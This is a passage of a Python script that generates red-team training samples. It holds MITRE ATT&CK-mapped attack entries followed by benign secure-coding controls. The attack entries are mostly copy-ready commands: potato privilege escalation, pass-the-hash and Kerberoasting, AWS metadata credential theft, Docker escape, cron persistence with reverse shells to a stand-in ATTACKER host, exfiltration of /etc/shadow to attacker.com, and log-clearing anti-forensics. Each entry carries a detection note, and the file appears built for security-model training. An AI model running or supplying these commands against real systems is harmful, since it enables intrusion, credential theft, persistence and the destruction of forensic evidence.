  "T1134.001 — Access Token Manipulation: Token Impersonation",
  "Exploit SeImpersonatePrivilege (commonly held by IIS/MSSQL service accounts) to escalate to SYSTEM privileges using potato attacks.",
  ["Check privileges: `whoami /priv` — look for SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege",
   "These privileges are held by: IIS AppPool accounts, MSSQL service accounts, Network Service",
   "PrintSpoofer: `PrintSpoofer.exe -i -c cmd` (Windows 10/Server 2016+)",
   "JuicyPotato: `JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}`",
   "GodPotato: `GodPotato.exe -cmd 'cmd /c whoami'` (works on all Windows versions)",
   "SweetPotato: combines multiple potato techniques",
   "RoguePotato: `RoguePotato.exe -r ATTACKER_IP -e 'cmd.exe /c reverse_shell.exe'`",
   "After SYSTEM: dump SAM with `reg save HKLM\\SAM sam.save`, extract hashes with secretsdump"],
  "**PrintSpoofer**, **JuicyPotato**, **GodPotato**, **SweetPotato**, **RoguePotato**",
  "Monitor for potato tool signatures (process names, CLSID abuse). Audit SeImpersonatePrivilege assignments. Detect unusual named pipe creation and COM object activation.")

A("SSH pivoting and port forwarding for lateral movement",
  "T1572 — Protocol Tunneling",
  "Use compromised SSH access to pivot into internal networks that are not directly reachable from the attacker's machine.",
  ["Local port forwarding: `ssh -L 8080:10.0.0.5:80 user@compromised` — access internal web server at localhost:8080",
   "Remote port forwarding: `ssh -R 9090:localhost:8080 user@attacker` — expose local service to attacker",
   "Dynamic SOCKS proxy: `ssh -D 1080 user@compromised` — route all traffic through compromised host",
   "Use SOCKS proxy: `proxychains nmap -sT 10.0.0.0/24` (configure proxychains to use localhost:1080)",
   "Multi-hop: `ssh -J user1@hop1,user2@hop2 user3@target` — chain through multiple hosts",
   "Background tunnel: `ssh -f -N -D 1080 user@compromised` (-f backgrounds, -N no command)",
   "Chisel alternative (no SSH): Server: `chisel server -p 8000 --reverse` Client: `chisel client ATTACKER:8000 R:socks`",
   "sshuttle (VPN over SSH): `sshuttle -r user@compromised 10.0.0.0/24` — transparent proxy"],
  "**ssh**, **proxychains**, **chisel**, **sshuttle**, **socat**, **ligolo-ng**",
  "Monitor for SSH tunneling flags (-L, -D, -R) in process command lines. Detect unusual SSH sessions (long duration, no interactive commands). Network flow analysis shows tunnel patterns.")

A("Persistence via cron jobs and scheduled tasks",
  "T1053 — Scheduled Task/Job",
  "Establish persistence on compromised systems by creating cron jobs (Linux) or scheduled tasks (Windows) that execute backdoors periodically.",
  ["Linux — user crontab: `(crontab -l; echo '* * * * * /tmp/backdoor.sh') | crontab -`",
   "Linux — system crontab: `echo '* * * * * root /tmp/backdoor.sh' >> /etc/crontab`",
   "Linux — cron.d: `echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /etc/cron.d/update`",
   "Linux — reverse shell cron: `*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`",
   "Windows — schtasks: `schtasks /create /tn \"Update\" /tr \"powershell -e BASE64_PAYLOAD\" /sc minute /mo 5`",
   "Windows — hidden: `schtasks /create /tn \"\\Microsoft\\Windows\\Update\\Check\" /tr \"payload.exe\" /sc daily`",
   "Disguise: name tasks after legitimate system tasks, use system directories",
   "Verify: Linux: `crontab -l`, `ls /etc/cron.*`; Windows: `schtasks /query /fo LIST /v`"],
  "**crontab**, **schtasks**, **at**, **systemd timers**",
  "Monitor crontab changes: `inotifywait -m /var/spool/cron`. Audit scheduled tasks: `schtasks /query`. File integrity monitoring on cron directories. Sysmon Event ID 1 for schtasks.exe execution.")

A("Reverse shell stabilization and upgrading",
  "T1059 — Command and Scripting Interpreter",
  "Upgrade a basic reverse shell to a fully interactive TTY with job control, tab completion, and proper terminal handling.",
  ["Step 1 — Spawn PTY: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`",
   "Alternative PTY spawns: `script /dev/null -c bash`, `perl -e 'exec \"/bin/bash\";'`",
   "Step 2 — Background shell: Press `Ctrl+Z` to suspend",
   "Step 3 — Configure terminal: `stty raw -echo; fg` (on attacker machine)",
   "Step 4 — Set terminal type: `export TERM=xterm` (in reverse shell)",
   "Step 5 — Set terminal size: `stty rows 40 cols 160` (match attacker terminal)",
   "Alternative — socat encrypted shell: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444`",
   "Alternative — rlwrap: `rlwrap nc -lvnp 4444` (adds readline to listener for arrow keys)"],
  "**python3**, **script**, **socat**, **rlwrap**, **stty**",
  "PTY spawn detected via process tree analysis (python/perl spawning bash). Network monitoring shows interactive traffic patterns. EDR detects pty.spawn in Python processes.")

A("Kerberoasting for Active Directory credential extraction",
  "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting",
  "Request Kerberos TGS tickets for service accounts with SPNs, then crack them offline to recover plaintext passwords. No special privileges required — any domain user can perform this.",
  ["Enumerate SPNs: `GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP`",
   "Alternative: `setspn -T DOMAIN -Q */*` (from Windows)",
   "Request TGS tickets: `GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request`",
   "Output is in hashcat/john format: `$krb5tgs$23$*...`",
   "Crack with hashcat: `hashcat -m 13100 tgs_hashes.txt rockyou.txt`",
   "Crack with john: `john tgs_hashes.txt --wordlist=rockyou.txt`",
   "Target high-value accounts: SQL service accounts, backup accounts, admin SPNs",
   "Check cracked password against admin groups: `net group 'Domain Admins' /domain`"],
  "**impacket (GetUserSPNs.py)**, **Rubeus**, **hashcat**, **john**, **PowerView**",
  "Monitor TGS requests (Event ID 4769) for unusual volume. Detect RC4 (type 0x17) encryption requests. Use Group Managed Service Accounts (gMSA) for service accounts. Enforce long, random passwords for service accounts.")

A("Pass-the-Hash attack for lateral movement",
  "T1550.002 — Use Alternate Authentication Material: Pass the Hash",
  "Use stolen NTLM password hashes to authenticate to remote Windows systems without knowing the plaintext password.",
  ["Dump hashes from compromised system: `secretsdump.py DOMAIN/admin@TARGET -just-dc-ntlm`",
   "Alternative: `mimikatz # sekurlsa::logonpasswords` (from memory)",
   "Alternative: `reg save HKLM\\SAM sam.save` + `reg save HKLM\\SYSTEM sys.save` → `secretsdump.py -sam sam.save -system sys.save LOCAL`",
   "Pass-the-Hash with psexec: `psexec.py DOMAIN/admin@TARGET -hashes LM:NTLM`",
   "Pass-the-Hash with wmiexec: `wmiexec.py DOMAIN/admin@TARGET -hashes :NTLM`",
   "Pass-the-Hash with evil-winrm: `evil-winrm -i TARGET -u admin -H NTLM_HASH`",
   "Pass-the-Hash with crackmapexec: `crackmapexec smb 10.0.0.0/24 -u admin -H NTLM_HASH`",
   "Spray hash across network to find where it works: `crackmapexec smb targets.txt -u admin -H NTLM --continue-on-success`"],
  "**impacket (psexec/wmiexec/smbexec)**, **mimikatz**, **crackmapexec**, **evil-winrm**, **Rubeus**",
  "Monitor Event ID 4624 (logon type 3, NtLmSsP). Detect anomalous NTLM authentication from unexpected sources. Implement Credential Guard. Use Protected Users group. Monitor for secretsdump/mimikatz signatures.")

A("AWS metadata service exploitation (IMDSv1)",
  "T1552.005 — Unsecured Credentials: Cloud Instance Metadata",
  "Exploit the AWS Instance Metadata Service (IMDS) v1 to steal IAM temporary credentials from EC2 instances, typically via SSRF.",
  ["Access metadata endpoint: `curl http://169.254.169.254/latest/meta-data/`",
   "Get instance identity: `curl http://169.254.169.254/latest/meta-data/instance-id`",
   "List IAM role: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
   "Steal credentials: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`",
   "Response contains: AccessKeyId, SecretAccessKey, Token (temporary, usually 6h validity)",
   "Configure stolen creds: `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`",
   "Enumerate access: `aws sts get-caller-identity`, `aws iam list-attached-role-policies --role-name ROLE`",
   "Exploit: `aws s3 ls`, `aws ec2 describe-instances`, `aws secretsmanager list-secrets`"],
  "**curl**, **aws cli**, **Pacu** (AWS exploitation framework), **enumerate-iam**",
  "Enforce IMDSv2 (requires token-based access). CloudTrail logs show API calls from instance role. GuardDuty detects credential use from unusual IPs. VPC flow logs show metadata endpoint access.")

A("Docker container escape via privileged mode",
  "T1611 — Escape to Host",
  "Escape from a Docker container running with `--privileged` flag to gain root access on the host system.",
  ["Check if privileged: `cat /proc/1/status | grep CapEff` — `0000003fffffffff` means all capabilities",
   "Alternative check: `fdisk -l` works in privileged (can see host disks)",
   "Method 1 — Mount host disk: `mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host bash`",
   "Method 2 — cgroup escape: create cgroup with notify_on_release and release_agent",
   "Method 3 — nsenter to host PID namespace: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`",
   "Method 4 — Docker socket: if `/var/run/docker.sock` is mounted, use Docker CLI to create new privileged container with host mount",
   "After escape: add SSH keys, create SUID binary, install rootkit for persistence",
   "Check for sensitive data: cloud credentials, Kubernetes secrets, application configs"],
  "**nsenter**, **mount**, **docker**, **deepce** (Docker escape scanner)",
  "Never run containers with `--privileged`. Use security profiles (AppArmor, seccomp). Monitor for container escape indicators: unusual mount operations, nsenter usage, cgroup manipulation.")

A("Data exfiltration techniques",
  "T1048 — Exfiltration Over Alternative Protocol",
  "Methods to extract data from a compromised network when standard channels (HTTP/HTTPS) are monitored or blocked.",
  ["DNS tunneling: `dnscat2` client → encode data in DNS queries → exfiltrate via DNS resolution",
   "DNS manual: `cat /etc/passwd | base64 | while read line; do nslookup $line.attacker.com; done`",
   "HTTPS exfil: `curl -X POST https://attacker.com/recv -d @/etc/shadow`",
   "ICMP tunneling: `icmpsh` — encode data in ICMP echo/reply packets",
   "Steganography: embed data in images with `steghide embed -cf image.jpg -ef secret.txt`",
   "Email exfil: `cat data.txt | mail -s 'report' attacker@gmail.com` (if SMTP is allowed)",
   "Cloud storage: `aws s3 cp sensitive_data.zip s3://attacker-bucket/` (using stolen or attacker creds)",
   "Encrypted archive: `tar czf - /sensitive/data | openssl enc -aes-256-cbc -pass pass:key | curl -X POST https://attacker.com/ -d @-`"],
  "**dnscat2**, **iodine** (DNS tunnel), **icmpsh**, **steghide**, **curl**, **openssl**",
  "DLP (Data Loss Prevention) systems monitor for sensitive data patterns. DNS monitoring detects tunneling (high query volume, long subdomain labels). Network flow analysis detects unusual upload volumes. Proxy logs show POST requests with large bodies to unknown domains.")

A("Log clearing and anti-forensics on Linux",
  "T1070 — Indicator Removal on Host",
  "Techniques to remove evidence of compromise from Linux systems to evade detection and hinder forensic investigation.",
  ["Clear bash history: `history -c && history -w` or `cat /dev/null > ~/.bash_history`",
   "Prevent history logging: `export HISTSIZE=0` or `unset HISTFILE` or prefix commands with space (HISTCONTROL=ignorespace)",
   "Clear auth logs: `echo '' > /var/log/auth.log` or `truncate -s 0 /var/log/auth.log`",
   "Clear syslog: `echo '' > /var/log/syslog`",
   "Selective log editing: `sed -i '/attacker_ip/d' /var/log/auth.log` (remove specific entries)",
   "Clear wtmp/utmp (login records): `utmpdump /var/log/wtmp` to inspect, then overwrite",
   "Timestomping: `touch -t 202301010000 /tmp/backdoor.sh` (set timestamp to specific date)",
   "Remove recently modified file traces: `find / -mmin -30 -type f 2>/dev/null` to identify what to clean"],
  "**shred** (secure file deletion), **touch** (timestomping), **sed** (selective log editing), **logrotate**",
  "Centralized logging (rsyslog to SIEM) — attacker can't clear remote logs. File integrity monitoring (AIDE, OSSEC, Tripwire). Immutable logs with append-only filesystems. auditd rules for log file access.")

A("Active Directory enumeration with BloodHound",
  "T1087.002 — Account Discovery: Domain Account",
  "Map Active Directory attack paths using BloodHound to identify the shortest path from current access to Domain Admin.",
  ["Collect data with SharpHound: `SharpHound.exe -c All` (from compromised Windows host)",
   "Alternative: `bloodhound-python -d DOMAIN -u user -p pass -ns DC_IP -c all` (from Linux)",
   "Import JSON/ZIP output into BloodHound GUI",
   "Pre-built queries: 'Find Shortest Paths to Domain Admins'",
   "Check: 'Find Principals with DCSync Rights' — can dump entire domain",
   "Check: 'Find Computers with Unconstrained Delegation'",
   "Check: 'Shortest Path from Owned Principals' (mark compromised accounts as owned)",
   "Identify attack path: User → Group Membership → AdminTo → Session → DA",
   "Export attack path and execute step by step"],
  "**SharpHound**, **BloodHound**, **bloodhound-python**, **Neo4j**, **PlumHound** (reporting)",
  "Monitor LDAP query volume (SharpHound makes thousands of LDAP queries). Detect SharpHound by process name or .NET assembly loading. Event ID 4662 for directory service access. Honey accounts/computers that trigger alerts when queried.")

A("S3 bucket misconfiguration exploitation",
  "T1530 — Data from Cloud Storage",
  "Discover and exploit misconfigured Amazon S3 buckets to access sensitive data, including public listing, unauthorized read, and ACL abuse.",
  ["Enumerate bucket names: try common patterns like `target-backup`, `target-dev`, `target-uploads`",
   "Check if bucket exists: `aws s3 ls s3://target-bucket --no-sign-request`",
   "List objects (public): `aws s3 ls s3://target-bucket --no-sign-request --recursive`",
   "Download all: `aws s3 sync s3://target-bucket ./loot --no-sign-request`",
   "Check ACL: `aws s3api get-bucket-acl --bucket target-bucket --no-sign-request`",
   "Check policy: `aws s3api get-bucket-policy --bucket target-bucket --no-sign-request`",
   "Test write access: `echo 'test' | aws s3 cp - s3://target-bucket/test.txt --no-sign-request`",
   "Look for sensitive files: `.env`, `credentials.csv`, `backup.sql`, `id_rsa`, `*.pem`"],
  "**aws cli**, **S3Scanner**, **bucket_finder**, **lazys3**, **grayhatwarfare.com**",
  "Enable S3 Block Public Access at account level. Use S3 Access Analyzer for continuous monitoring. CloudTrail S3 data events log all access. Bucket policies should deny public access. Regular audits with AWS Config rules.")

# ═══════════════════════════════════════════════════════════════
# SECTION 5: BENIGN CONTROLS (15 samples)
# ═══════════════════════════════════════════════════════════════

B("Python",
  'import psycopg2\n\ndef get_user(username):\n    conn = psycopg2.connect(DSN)\n    cur = conn.cursor()\n    cur.execute("SELECT * FROM users WHERE name = %s", (username,))\n    return cur.fetchone()',
  "1. **Parameterized Query:** Uses `%s` placeholder with tuple parameter `(username,)` — psycopg2 handles escaping\n2. **SQL Injection Prevention:** User input never touches the query string — database driver separates code from data\n3. **Why it's safe:** Even if username contains `'; DROP TABLE users;--`, it's treated as a literal string value, not SQL code\n4. **Best Practice:** This is the OWASP-recommended approach for SQL injection prevention")

B("Java",
  'public User findUser(String email) throws SQLException {\n    PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");\n    ps.setString(1, email);\n    ResultSet rs = ps.executeQuery();\n    return rs.next() ? mapUser(rs) : null;\n}',
  "1. **PreparedStatement:** Uses `?` placeholder with `setString()` binding — JDBC driver handles type-safe escaping\n2. **SQL Injection Prevention:** Query structure is compiled separately from data — cannot be altered by input\n3. **Type Safety:** `setString` ensures the parameter is treated as a string, preventing type confusion attacks\n4. **Additional:** PreparedStatements are also more performant due to query plan caching")

B("Python",
  'import bcrypt\n\ndef register(username, password):\n    salt = bcrypt.gensalt(rounds=12)\n    password_hash = bcrypt.hashpw(password.encode("utf-8"), salt)\n    db.execute("INSERT INTO users (name, password_hash) VALUES (%s, %s)",\n               (username, password_hash))\n\ndef verify(username, password):\n    user = db.fetchone("SELECT password_hash FROM users WHERE name = %s", (username,))\n    if user and bcrypt.checkpw(password.encode("utf-8"), user.password_hash):\n        return True\n    return False',
  "1. **bcrypt Hashing:** Uses bcrypt with 12 rounds — computationally expensive, resistant to brute force and GPU attacks\n2. **Automatic Salting:** `bcrypt.gensalt()` generates unique random salt per password — prevents rainbow table attacks\n3. **Timing-Safe Comparison:** `bcrypt.checkpw()` performs constant-time comparison — prevents timing attacks\n4. **Parameterized Queries:** SQL uses `%s` placeholders — prevents SQL injection\n5. **No Plaintext Storage:** Password is never stored in cleartext")

B("Go",
  'import (\n    "net/http"\n    "path/filepath"\n    "strings"\n)\n\nfunc downloadHandler(w http.ResponseWriter, r *http.Request) {\n    filename := r.URL.Query().Get("file")\n    baseDir := "/var/www/uploads"\n    cleanPath := filepath.Clean(filepath.Join(baseDir, filename))\n    if !strings.HasPrefix(cleanPath, baseDir) {\n        http.Error(w, "Forbidden", http.StatusForbidden)\n        return\n    }\n    http.ServeFile(w, r, cleanPath)\n}',
  "1. **Path Canonicalization:** `filepath.Clean` resolves `.`, `..`, and redundant separators\n2. **Directory Containment:** `strings.HasPrefix` verifies resolved path stays within `baseDir`\n3. **Path Traversal Prevention:** Even with `../../../etc/passwd`, cleaned path won't escape the uploads directory\n4. **Secure Serving:** `http.ServeFile` handles Content-Type and range requests safely")

B("JavaScript",
  'const DOMPurify = require("dompurify");\nconst { JSDOM } = require("jsdom");\nconst window = new JSDOM("").window;\nconst purify = DOMPurify(window);\n\nfunction renderComment(comment) {\n  const clean = purify.sanitize(comment, {\n    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],\n    ALLOWED_ATTR: ["href"]\n  });\n  return `<div class="comment">${clean}</div>`;\n}',
  "1. **DOMPurify Sanitization:** Industry-standard HTML sanitizer that strips all dangerous elements and attributes\n2. **Allowlist Approach:** Only permits specific safe tags (`b`, `i`, `em`, `strong`, `a`) and attributes (`href`)\n3. **XSS Prevention:** Removes `<script>`, event handlers (`onerror`, `onclick`), `javascript:` URIs, and all other attack vectors\n4. **Server-Side Execution:** Running DOMPurify on the server (via jsdom) ensures sanitization can't be bypassed by client-side tampering")

B("Node.js",
  'const express = require("express");\nconst helmet = require("helmet");\nconst rateLimit = require("express-rate-limit");\nconst csrf = require("csurf");\n\nconst app = express();\napp.use(helmet());\napp.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));\napp.use(csrf({ cookie: true }));\n\napp.get("/form", (req, res) => {\n  res.render("form", { csrfToken: req.csrfToken() });\n});',
  "1. **Helmet:** Sets security headers (X-Content-Type-Options, X-Frame-Options, CSP, HSTS, etc.)\n2. **Rate Limiting:** Prevents brute force and DoS — max 100 requests per 15-minute window\n3. **CSRF Protection:** Token-based CSRF prevention — forms must include valid token\n4. **Defense in Depth:** Multiple security layers working together\n5. **Clickjacking Prevention:** Helmet sets X-Frame-Options to prevent iframe embedding")

B("Java",
  'import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.GCMParameterSpec;\nimport java.security.SecureRandom;\n\npublic byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {\n    byte[] iv = new byte[12];\n    new SecureRandom().nextBytes(iv);\n    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");\n    cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));\n    byte[] ciphertext = cipher.doFinal(plaintext);\n    byte[] result = new byte[iv.length + ciphertext.length];\n    System.arraycopy(iv, 0, result, 0, iv.length);\n    System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);\n    return result;\n}',
  "1. **AES-256-GCM:** Authenticated encryption — provides both confidentiality and integrity\n2. **Random IV:** 12-byte IV generated with `SecureRandom` — cryptographically secure, never reused\n3. **128-bit Auth Tag:** GCM tag detects any ciphertext tampering — prevents chosen-ciphertext attacks\n4. **No ECB:** GCM mode (not ECB) — identical plaintext blocks produce different ciphertext\n5. **IV Prepended:** IV stored with ciphertext for decryption — no need for separate IV channel")

B("C",
  'void process_input(const char *user_input) {\n    char buffer[256];\n    strncpy(buffer, user_input, sizeof(buffer) - 1);\n    buffer[sizeof(buffer) - 1] = \'\\0\';\n    printf("Received: %s\\n", buffer);\n}',
  "1. **Bounded Copy:** `strncpy` with `sizeof(buffer) - 1` prevents buffer overflow regardless of input length\n2. **Null Termination:** Explicit `buffer[sizeof(buffer)-1] = '\\0'` ensures string is always terminated (strncpy doesn't guarantee this when input is too long)\n3. **Format String Safety:** `printf` uses `%s` format specifier — not vulnerable to format string attacks\n4. **Stack Protection:** Buffer cannot be overflowed — return address is safe from overwrite")

B("Python",
  'import requests\n\ndef fetch_api_data(endpoint):\n    url = f"https://api.example.com/v2/{endpoint}"\n    response = requests.get(\n        url,\n        verify=True,\n        timeout=10,\n        headers={"Authorization": f"Bearer {os.environ[\'API_TOKEN\']}"}\n    )\n    response.raise_for_status()\n    return response.json()',
  "1. **TLS Verification:** `verify=True` (default) validates SSL certificate — prevents MITM attacks\n2. **Timeout:** 10-second timeout prevents hanging connections and resource exhaustion\n3. **Environment Variable Credentials:** API token loaded from `os.environ` — not hardcoded in source\n4. **Error Handling:** `raise_for_status()` raises exception on HTTP errors — prevents silent failures\n5. **HTTPS:** Uses `https://` scheme — encrypted transport")

B("Ruby",
  'class UsersController < ApplicationController\n  before_action :authenticate_user!\n  before_action :set_user, only: [:show, :update]\n  before_action :authorize_user!, only: [:update]\n\n  def update\n    @user.update!(user_params)\n    render json: @user\n  end\n\n  private\n\n  def user_params\n    params.require(:user).permit(:name, :email, :bio)\n  end\n\n  def set_user\n    @user = User.find(params[:id])\n  end\n\n  def authorize_user!\n    head :forbidden unless @user == current_user || current_user.admin?\n  end\nend',
  "1. **Strong Parameters:** `permit(:name, :email, :bio)` — only whitelisted attributes can be updated, preventing mass assignment of `role`, `admin`, etc.\n2. **Authentication:** `authenticate_user!` ensures only logged-in users access the controller\n3. **Authorization:** `authorize_user!` ensures users can only update their own profile (or admin can update any)\n4. **Before Actions:** Security checks run before business logic — fail-secure design\n5. **No IDOR:** Authorization check prevents accessing/modifying other users' data")

B("Node.js",
  'const multer = require("multer");\nconst path = require("path");\nconst crypto = require("crypto");\nconst { readChunk } = require("read-chunk");\nconst fileType = require("file-type");\n\nconst ALLOWED_TYPES = new Set(["image/jpeg", "image/png", "image/gif", "application/pdf"]);\nconst MAX_SIZE = 5 * 1024 * 1024; // 5MB\n\nconst upload = multer({\n  limits: { fileSize: MAX_SIZE },\n  storage: multer.diskStorage({\n    destination: "uploads/",\n    filename: (req, file, cb) => {\n      const ext = path.extname(file.originalname).toLowerCase();\n      cb(null, crypto.randomUUID() + ext);\n    }\n  }),\n  fileFilter: async (req, file, cb) => {\n    if (!ALLOWED_TYPES.has(file.mimetype)) return cb(new Error("Invalid type"));\n    cb(null, true);\n  }\n});',
  "1. **Extension Whitelist:** Only `.jpg`, `.png`, `.gif`, `.pdf` extensions accepted\n2. **MIME Type Validation:** Checks declared MIME type against allowlist\n3. **Random Filenames:** `crypto.randomUUID()` prevents filename guessing and path traversal\n4. **Size Limit:** 5MB max prevents storage exhaustion DoS\n5. **No Original Filename:** Original name discarded — prevents directory traversal via filename\n6. **Improvement:** Add magic byte validation with `file-type` library for content-based type checking")

B("Rust",
  'use std::io::{self, Read};\n\nfn process_input() -> io::Result<String> {\n    let mut buffer = String::new();\n    io::stdin().read_to_string(&mut buffer)?;\n    let trimmed = buffer.trim();\n    if trimmed.len() > 1024 {\n        return Err(io::Error::new(io::ErrorKind::InvalidData, "Input too long"));\n    }\n    Ok(trimmed.to_string())\n}',
  "1. **Memory Safety:** Rust's ownership system prevents buffer overflows, use-after-free, and double-free at compile time\n2. **No Unsafe Blocks:** No `unsafe` keyword — all memory operations are bounds-checked\n3. **Input Length Validation:** Explicit check limits input to 1024 bytes — prevents resource exhaustion\n4. **Error Handling:** `Result<T, E>` type forces caller to handle errors — no silent failures\n5. **No Null Pointers:** Rust's `Option<T>` replaces null — eliminates null pointer dereference class entirely")

B("Python",
  'from flask import Flask, jsonify\nimport logging\n\napp = Flask(__name__)\napp.config["DEBUG"] = False\nlogger = logging.getLogger(__name__)\n\n@app.errorhandler(404)\ndef not_found(e):\n    return jsonify({"error": "Resource not found"}), 404\n\n@app.errorhandler(500)\ndef server_error(e):\n    error_id = uuid.uuid4().hex[:8]\n    logger.error(f"Internal error {error_id}: {e}", exc_info=True)\n    return jsonify({"error": "Internal server error", "reference": error_id}), 500',
  "1. **Debug Disabled:** `DEBUG = False` prevents Werkzeug debugger exposure in production\n2. **Generic Error Responses:** Returns generic messages — no stack traces, file paths, or library versions\n3. **Error Reference ID:** Unique ID allows support to correlate user reports with server logs\n4. **Server-Side Logging:** Full exception logged server-side for debugging — details never sent to client\n5. **Information Leakage Prevention:** Attacker cannot extract internal details from error responses")

B("Go",
  'func loginHandler(w http.ResponseWriter, r *http.Request) {\n    username := r.FormValue("username")\n    password := r.FormValue("password")\n\n    user, err := db.GetUser(username)\n    if err != nil || user == nil {\n        http.Error(w, "Invalid credentials", http.StatusUnauthorized)\n        return\n    }\n\n    err = bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password))\n    if err != nil {\n        http.Error(w, "Invalid credentials", http.StatusUnauthorized)\n        return\n    }\n\n    // Generate new session\n    session := generateSecureSession(user.ID)\n    http.SetCookie(w, &http.Cookie{\n        Name:     "session",\n        Value:    session,\n        HttpOnly: true,\n        Secure:   true,\n        SameSite: http.SameSiteStrictMode,\n        MaxAge:   3600,\n    })\n}',
  "1. **bcrypt Verification:** `CompareHashAndPassword` is timing-safe — prevents timing attacks on password comparison\n2. **Generic Error Messages:** Same 'Invalid credentials' for wrong username AND wrong password — prevents user enumeration\n3. **HttpOnly Cookie:** `HttpOnly: true` prevents JavaScript access — mitigates XSS cookie theft\n4. **Secure Flag:** `Secure: true` ensures cookie only sent over HTTPS\n5. **SameSite Strict:** Prevents CSRF — cookie not sent with cross-origin requests\n6. **Session Regeneration:** New session generated on login — prevents session fixation")


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'data', 'custom_cot')
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, 'redteam_cot.jsonl')

    with open(out_path, 'w', encoding='utf-8') as f:
        for sample in SAMPLES:
            f.write(json.dumps(sample, ensure_ascii=False) + '\n')

    print(f"✓ Generated {len(SAMPLES)} red team training samples")
    print(f"  → {out_path}")

    # Count by type
    vuln = sum(1 for s in SAMPLES if 'CWE Classification' in s['output'])
    exploit = sum(1 for s in SAMPLES if 'Kill Chain' in s['output'])
    payload = sum(1 for s in SAMPLES if 'Payload Type' in s['output'])
    attack = sum(1 for s in SAMPLES if 'MITRE ATT&CK' in s['output'])
    benign = sum(1 for s in SAMPLES if 'No Vulnerability Detected' in s['output'])
    print(f"  Breakdown: {vuln} vulns, {exploit} exploit chains, {payload} payloads, {attack} attack techniques, {benign} benign controls")

if __name__ == '__main__':
    main()
